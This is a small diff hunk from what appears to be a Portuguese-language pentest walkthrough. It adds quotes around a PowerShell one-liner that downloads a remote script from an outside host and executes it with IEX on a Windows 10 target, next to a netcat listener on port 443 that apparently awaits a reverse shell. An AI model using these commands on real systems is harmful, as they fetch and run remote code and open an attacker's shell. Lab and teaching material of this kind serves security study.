@@ -409,5 +409,5 @@ nc -nlvp 443
 ```
 - Comando executado no Windows10
 ```
-powershell (New-Object System.Net.WebClient).DownloadString('http://update-sync.org/pos1.ps1')|IEX
+powershell "(New-Object System.Net.WebClient).DownloadString('http://update-sync.org/pos1.ps1')|IEX"
 ```
